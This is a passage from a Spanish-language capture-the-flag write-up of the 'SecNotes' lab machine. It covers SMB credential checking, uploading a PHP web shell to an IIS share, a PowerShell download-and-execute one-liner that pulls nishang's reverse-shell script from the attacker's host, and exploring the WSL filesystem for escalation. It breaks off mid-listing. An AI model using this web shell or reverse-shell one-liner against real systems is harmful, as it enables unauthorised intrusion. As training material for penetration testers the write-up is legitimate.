<img src="images/Screenshot_11.png" alt="Write-up Image"></p>
<p>Y podemos iniciar sesión como <code>tyler</code>
<img src="images/Screenshot_12.png" alt="Write-up Image"></p>
<p>Encontramos lo que parece credenciales para acceder a un recurso compartido a nivel de red.
<img src="images/Screenshot_13.png" alt="Write-up Image"></p>
<p>Con <code>netexec</code> podemos comprobar si son válidas&hellip;</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ nxc smb 10.129.18.0 -u <span style="color:#0ff;font-weight:bold">&#39;tyler&#39;</span> -p <span style="color:#0ff;font-weight:bold">&#39;92g!mA8BGjOirkL%OG*&amp;&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>SMB         10.129.18.0     <span style="color:#ff0;font-weight:bold">445</span>    SECNOTES         [*] Windows <span style="color:#ff0;font-weight:bold">10</span> Enterprise <span style="color:#ff0;font-weight:bold">17134</span> (name:SECNOTES) (domain:SECNOTES) (signing:False) (SMBv1:True)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>SMB         10.129.18.0     <span style="color:#ff0;font-weight:bold">445</span>    SECNOTES         [+] SECNOTES<span style="color:#0ff;font-weight:bold">\t</span>yler:92g!mA8BGjOirkL%OG*&amp;</span></span></code></pre></div>
<h1 id="foothold">Foothold</h1>
<p>Podemos ver los recursos compartidos a nivel de red a los que puede acceder este usuario y vemos que tiene permisos de lectura y escritura para <code>new-site</code>
<img src="images/Screenshot_14.png" alt="Write-up Image"></p>
<p>Vemos algunos recursos típicos de un IIS.
<img src="images/Screenshot_15.png" alt="Write-up Image"></p>
<p>Por el puerto 8808/TCP encontramos lo siguiente..
<img src="images/Screenshot_16.png" alt="Write-up Image"></p>
<p>Vamos a probar a subir un archivo y ver si se ve reflejado en este servicio web.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ <span style="color:#fff;font-weight:bold">echo</span> <span style="color:#0ff;font-weight:bold">&#34;test&#34;</span> &gt; test.txt</span></span></code></pre></div>
<p>Y ahora con <code>smbclient</code></p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>smb: <span style="color:#0ff;font-weight:bold">\&gt;</span> put test.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>putting file test.txt as <span style="color:#0ff;font-weight:bold">\t</span>est.txt (0,0 kb/s) (average 0,0 kb/s)</span></span></code></pre></div>
<p>Y efectivamente, se ve reflejado.
<img src="images/Screenshot_17.png" alt="Write-up Image"></p>
<p>Vamos a ver si se interpreta código PHP en este sitio web..</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ <span style="color:#fff;font-weight:bold">echo</span> <span style="color:#0ff;font-weight:bold">&#34;&lt;?php phpinfo(); ?&gt;&#34;</span> &gt; info.php
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>┌─[192.168.1.52]─[pointedsec@parrot]─[~/Desktop/secnotes/content]
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>└──╼ [★]$ smbclient <span style="color:#0ff;font-weight:bold">\\\\</span>10.129.18.0<span style="color:#0ff;font-weight:bold">\\</span>new-site -U <span style="color:#0ff;font-weight:bold">&#39;tyler%92g!mA8BGjOirkL%OG*&amp;&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>Try <span style="color:#0ff;font-weight:bold">&#34;help&#34;</span> to get a list of possible commands.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>smb: <span style="color:#0ff;font-weight:bold">\&gt;</span> put info.php
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>putting file info.php as <span style="color:#0ff;font-weight:bold">\i</span>nfo.php (0,2 kb/s) (average 0,2 kb/s)</span></span></code></pre></div>
<p>Y vemos que si, ahora solo quedaría subirnos una web shell.
<img src="images/Screenshot_18.png" alt="Write-up Image"></p>
<p>Podemos comprobar que no hay ninguna <code>disable_functions</code>
<img src="images/Screenshot_19.png" alt="Write-up Image"></p>
<p>Creamos una web shell sencilla&hellip;</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>&lt;?php
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>	<span style="color:#fff;font-weight:bold">echo</span> <span style="color:#0ff;font-weight:bold">&#34;&lt;pre&gt;&#34;</span> . shell_exec($_GET[<span style="color:#0ff;font-weight:bold">&#34;cmd&#34;</span>]) . <span style="color:#0ff;font-weight:bold">&#34;&lt;/pre&gt;&#34;</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>?</span></span></code></pre></div>
<p>La subimos&hellip;</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>smb: <span style="color:#0ff;font-weight:bold">\&gt;</span> put shell.php
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>putting file shell.php as <span style="color:#0ff;font-weight:bold">\s</span>hell.php (0,6 kb/s) (average 0,6 kb/s)</span></span></code></pre></div>
<p>¡Y tenemos ejecución remota de comandos!
<img src="images/Screenshot_20.png" alt="Write-up Image"></p>
<p>Ahora con el script <code>Invoke-PowerShellTcp.ps1</code> de <code>nishang</code> vamos a ganar acceso a la máquina.</p>
<p>Nos copiamos el script y le añadimos esta línea a lo último.</p>
<p><img src="images/Screenshot_21.png" alt="Write-up Image"></p>
<p>Ahora servimos el script por el puerto 8081.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ python3 -m http.server <span style="color:#ff0;font-weight:bold">8081</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Serving HTTP on 0.0.0.0 port <span style="color:#ff0;font-weight:bold">8081</span> (http://0.0.0.0:8081/) ...</span></span></code></pre></div>
<p>Nos ponemos en escucha con <code>netcat</code> por el puerto 443.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ff0;font-weight:bold">443</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>listening on [any] <span style="color:#ff0;font-weight:bold">443</span> ...</span></span></code></pre></div>
<p>Y ejecutamos este one-liner a través de la web shell.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span><span style="color:#fff;font-weight:bold">echo </span>IEX(<span style="color:#fff;font-weight:bold">New-Object</span> Net.WebClient).DownloadString(<span style="color:#0ff;font-weight:bold">&#39;http://10.10.14.85:8081/Invoke-PowerShellTcp.ps1&#39;</span>) | powershell -noprofile -</span></span></code></pre></div>
<p><img src="images/Screenshot_22.png" alt="Write-up Image"></p>
<p>Y ganamos acceso a la máquina víctima</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ff0;font-weight:bold">443</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>listening on [any] <span style="color:#ff0;font-weight:bold">443</span> ...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>connect to [10.10.14.85] from (UNKNOWN) [10.129.18.0] <span style="color:#ff0;font-weight:bold">59765</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>Windows PowerShell running as user SECNOTES$ on SECNOTES
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>Copyright (C) <span style="color:#ff0;font-weight:bold">2015</span> Microsoft Corporation. All rights reserved.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>PS C:<span style="color:#0ff;font-weight:bold">\i</span>netpub<span style="color:#0ff;font-weight:bold">\n</span>ew-site&gt;whoami
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>secnotes<span style="color:#0ff;font-weight:bold">\t</span>yler</span></span></code></pre></div>
<p>Y podemos leer la flag de usuario.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span><span style="color:#fff;font-weight:bold">PS </span>C:\Users\tyler\Desktop&gt; <span style="color:#fff;font-weight:bold">type </span>user.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>e175f96d71f268b1...</span></span></code></pre></div>
<h1 id="privilege-escalation">Privilege Escalation</h1>
<p>Según vemos la flag, nos llama la atención un acceso directo.</p>
<p><img src="images/Screenshot_23.png" alt="Write-up Image"></p>
<p>¿bash? Pero si estamos en Windows.</p>
<p>También podemos detectar un directorio <code>Distros</code> en la raíz del sistema.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span><span style="color:#fff;font-weight:bold">PS </span>C:\Distros&gt; <span style="color:#fff;font-weight:bold">dir
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span><span style="color:#fff;font-weight:bold"></span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>    Directory<span style="color:#f00">:</span> C:\Distros
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>Mode                LastWriteTime         Length Name                                                                  
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>----                -------------         ------ ----                                                                  
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">9</span><span>d-----        <span style="color:#ff0;font-weight:bold">6</span>/<span style="color:#ff0;font-weight:bold">21</span>/<span style="color:#ff0;font-weight:bold">2018</span>   <span style="color:#ff0;font-weight:bold">5</span><span style="color:#f00">:</span><span style="color:#ff0;font-weight:bold">59</span> PM                Ubuntu</span></span></code></pre></div>
<p>Podemos deducir que va a entrar en juego WSL (Windows Subsystem for Linux), una manera de poder tener tu sistema operativo Linux dentro de tu máquina Windows.</p>
<p>Entonces vamos a explorar los archivos de este subsistema ya que se tienen que guardar en alguna parte del disco duro, ¿no?</p>
<p>Buscando un poco en Google nos encontramos con alguien que se preguntó lo mismo hace muchos años.
<a href="https://superuser.com/questions/1185033/what-is-the-home-directory-on-windows-subsystem-for-linux">https://superuser.com/questions/1185033/what-is-the-home-directory-on-windows-subsystem-for-linux</a></p>
<p>Y con esta respuesta.
<img src="images/Screenshot_24.png" alt="Write-up Image"></p>
<p>Y efectivamente, aquí se encuentra el subsistema linux.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span><span style="color:#fff;font-weight:bold">PS </span>C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs&gt; <span style="color:#fff;font-weight:bold">dir
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span><span style="color:#fff;font-weight:bold"></span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>    Directory<span style="color:#f00">:</span> 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>    C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>Mode                LastWriteTime         Length Name                                                                  
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>----                -------------         ------ ----                                                                  
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>da----        <span style="color:#ff0;font-weight:bold">6</span>/<span style="color:#ff0;font-weight:bold">21</span>/<span style="color:#ff0;font-weight:bold">2018</span>   <span style="color:#ff0;font-weight:bold">6</span><span style="color:#f00">:</span><span style="color:#ff0;font-weight:bold">03</span> PM                bin                                                                   
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>da----        <span style="color:#ff0;font-weight:bold">6</span>/<span style="color:#ff0;font-weight:bold">21</span>/<span style="color:#ff0;font-weight:bold">2018</span>   <span style="color:#ff0;font-weight:bold">6</span><span style="color:#f00">:</span><span style="color:#ff0;font-weight:bold">00</span> PM                boot                                                                  
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>da----        <span style="color:#ff0;font-weight:bold">6</span>/<span style="color:#ff0;font-weight:bold">21</span>/<span style="color:#ff0;font-weight:bold">2018</span>   <span style="color:#ff0;font-weight:bold">6</span><span style="color:#f00">:</span><span style="color:#ff0;font-weight:bold">00</span> PM                dev                                                                   
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>da----        <span style="color:#ff0;font-weight:bold">6</span>/<span style="color:#ff0;font-weight:bold">22</span>/<span style="color:#ff0;font-weight:bold">2018</span>   <span style="color:#ff0;font-weight:bold">3</span><span style="color:#f00">:</span><span style="color:#ff0;font-weight:bold">00</span> AM                etc                                                                   
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>da----        <span style="color:#ff0;font-weight:bold">6</span>/<span style="color:#ff0;font-weight:bold">21</span>/<span style="color:#ff0;font-weight:bold">2018</span>   <span style="color:#ff0;font-weight:bold">6</span><span style="color:#f00">:</span><span style="color:#ff0;font-weight:bold">00</span> PM                home                                                                  
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>da----        <span style="color:#ff0;font-weight:bold">6</span>/<span style="color:#ff0;font-weight:bold">21</span>/<span style="color:#ff0;font-weight:bold">2018</span>   <span style="color:#ff0;font-weight:bold">6</span><span style="color:#f00">:</span><span style="color:#ff0;font-weight:bold">00</span> PM                lib                                                                   
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>da----        <span style="color:#ff0;font-weight:bold">6</span>/<span style="color:#ff0;font-weight:bold">21</span>/<span style="color:#ff0;font-weight:bold">2018</span>   <span style="color:#ff0;font-weight:bold">6</span><span style="color:#f00">:</span><span style="color:#ff0;font-weight:bold">00</span> PM                lib64                                                                 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>da----        <span style="color:#ff0;font-weight:bold">6</span>/<span style="color:#ff0;font-weight:bold">21</span>/<span style="color:#ff0;font-weight:bold">2018</span>   <span style="color:#ff0;font-weight:bold">6</span><span style="color:#f00">:</span><span style="color:#ff0;font-weight:bold">00</span> PM                media                                                                 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>da----        <span style="color:#ff0;font-weight:bold">6</span>/<span style="color:#ff0;font-weight:bold">21</span>/<span style="color:#ff0;font-weight:bold">2018</span>   <span style="color:#ff0;font-weight:bold">6</span><span style="color:#f00">:</span><span style="color:#ff0;font-weight:bold">03</span> PM                mnt                                                                   
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>da----        <span style="color:#ff0;font-weight:bold">6</span>/<span style="color:#ff0;font-weight:bold">21</span>/<span style="color:#ff0;font-weight:bold">2018</span>   <span style="color:#ff0;font-weight:bold">6</span><span style="color:#f00">:</span><span style="color:#ff0;font-weight:bold">00</span> PM                opt                                                                   
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span>da----        <span style="color:#ff0;font-weight:bold">6</span>/<span style="color:#ff0;font-weight:bold">21</span>/<span style="color:#ff0;font-weight:bold">2018</span>   <span style="color:#ff0;font-weight:bold">6</span><span style="color:#f00">:</span><span style="color:#ff0;font-weight:bold">00</span> PM                proc                                                                  
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span>da----        <span style="color:#ff0;font-weight:bold">6</span>/<span style="color:#ff0;font-weight:bold">22</span>/<span style="color:#ff0;font-weight:bold">2018</span>   <span style="color:#ff0;font-weight:bold">2</span><span style="color:#f00">:</span><span style="color:#ff0;font-weight:bold">44</span> PM                root                                                                  
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span>da----        <span style="color:#ff0;font-weight:bold">6</span>/<span style="color:#ff0;font-weight:bold">21</span>/<span style="color:#ff0;font-weight:bold">2018</span>   <span style="color:#ff0;font-weight:bold">6</span><span style="color:#f00">:</span><span style="color:#ff0;font-weight:bold">00</span> PM                run                                                                   
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23</span><span>da----        <span style="color:#ff0;font-weight:bold">6</span>/<span style="color:#ff0;font-weight:bold">22</span>/<span style="color:#ff0;font-weight:bold">2018</span>   <span style="color:#ff0;font-weight:bold">2</span><span style="color:#f00">:</span><span style="color:#ff0;font-weight:bold">57</span> AM                sbin                                                                  
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24</span><span>da----        <span style="color:#ff0;font-weight:bold">6</span>/<span style="color:#ff0;font-weight:bold">21</span>/<span style="color:#ff0;font-weight:bold">2018</span>   <span style="color:#ff0;font-weight:bold">6</span><span style="color:#f00">:</span><span style="color:#ff0;font-weight:bold">00</span> PM                snap                                                                  
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25</span><span>da----        <span style="color:#ff0;font-weight:bold">6</span>/<span style="color:#ff0;font-weight:bold">21</span>/<span style="color:#ff0;font-weight:bold">2018</span>   <span style="color:#ff0;font-weight:bold">6</span><span style="color:#f00">:</span><span style="color:#ff0;font-weight:bold">00</span> PM                srv                                                                   
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26</span><span>da----        <span style="color:#ff0;font-weight:bold">6</span>/<span style="color:#ff0;font-weight:bold">21</span>/<span style="color:#ff0;font-weight:bold">2018</span>   <span style="color:#ff0;font-weight:bold">6</span><span style="color:#f00">:</span><span style="color:#ff0;font-weight:bold">00</span> PM                sys                                                                   
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27</span><span>da----        <span style="color:#ff0;font-weight:bold">6</span>/<span style="color:#ff0;font-weight:bold">22</span>/<span style="color:#ff0;font-weight:bold">2018</span>   <span style="color:#ff0;font-weight:bold">2</span><span style="color:#f00">:</span><span style="color:#ff0;font-weight:bold">25</span> PM                tmp                                                                   
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28</span><span>da----        <span style="color:#ff0;font-weight:bold">6</span>/<span style="color:#ff0;font-weight:bold">21</span>/<span style="color:#ff0;font-weight:bold">2018</span>   <span style="color:#ff0;font-weight:bold">6</span><span style="color:#f00">:</span><span style="color:#ff0;font-weight:bold">02</span> PM                usr                                                                   
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29</span><span>da----        <span style="color:#ff0;font-weight:bold">6</span>/<span style="color:#ff0;font-weight:bold">21</span>/<span style="color:#ff0;font-weight:bold">2018</span>   <span style="color:#ff0;font-weight:bold">6</span><span style="color:#f00">:</span><span style="color:#ff0;font-weight:bold">03</span> PM                var                                                                   
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30</span><span>-a----        <span style="color:#ff0;font-weight:bold">6</span>/<span style="color:#ff0;font-weight:bold">22</span>/<span style="color:#ff0;font-weight:bold">2018</span>   <span style="color:#ff0;font-weight:bold">2</span><span style="color:#f00">:</span><span style="color:#ff0;font-weight:bold">25</span> PM          <span style="color:#ff0;font-weight:bold">87944</span> init                                     </span></span></code></pre></div>
<p>Viendo el archivo <code>/root/.bash_history</code> encontramos una línea interesante.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span><span style="color:#fff;font-weight:bold">PS </span>C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\root&gt; <span style="color:#fff;font-weight:bold">type </span>.bash_history
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span><span style="color:#fff;font-weight:bold">cd </span>/mnt/c/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span><span style="color:#fff;font-weight:bold">ls
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span><span style="color:#fff;font-weight:bold">cd </span>Users/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span><span style="color:#fff;font-weight:bold">cd </span>/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span><span style="color:#fff;font-weight:bold">cd </span>~
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span><span style="color:#fff;font-weight:bold">ls
